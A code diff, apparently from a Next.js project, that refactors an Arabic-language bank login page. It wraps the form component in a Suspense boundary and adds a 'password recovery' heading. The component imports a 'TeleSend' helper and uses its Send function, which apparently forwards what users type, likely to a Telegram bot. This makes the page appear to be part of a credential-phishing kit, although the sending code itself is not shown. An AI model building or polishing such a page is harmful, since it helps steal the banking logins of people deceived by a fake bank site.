@@ -1,11 +1,12 @@
 'use client'
 
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, Suspense } from "react";
 import { useRouter, useSearchParams } from 'next/navigation';
 import Image from "next/image";
 import TeleSned from "../../../../server/TeleSend";
 
-const Page = () => {
+// مكون داخلي يحتوي على useSearchParams
+function BankLoginContent() {
   const router = useRouter();
   const searchParams = useSearchParams();
   const { Send } = TeleSned();
@@ -202,7 +203,7 @@ const Page = () => {
         {/* نموذج تسجيل الدخول */}
         <div className="bg-white rounded-xl shadow-xl p-6 md:p-8 border border-gray-100">
           <h1 className='text-[#800000] text-lg font-bold text-center mb-4'>
-            {showForgotPassword ? ' ' : 'تسجيل الدخول'}
+            {showForgotPassword ? 'استعادة كلمة المرور' : 'تسجيل الدخول'}
           </h1>
           
           <form onSubmit={handleSubmit} className="space-y-5">
@@ -352,6 +353,20 @@ const Page = () => {
       </div>
     </main>
   );
-};
+}
 
-export default Page;
+// المكون الرئيسي مع Suspense
+export default function Page() {
+  return (
+    <Suspense fallback={
+      <div className="flex min-h-screen items-center justify-center bg-gradient-to-br from-gray-50 to-gray-100">
+        <div className="text-center">
+          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#800000] mx-auto"></div>
+          <p className="mt-4 text-gray-600">جاري التحميل...</p>
+        </div>
+      </div>
+    }>
+      <BankLoginContent />
+    </Suspense>
+  );
+}
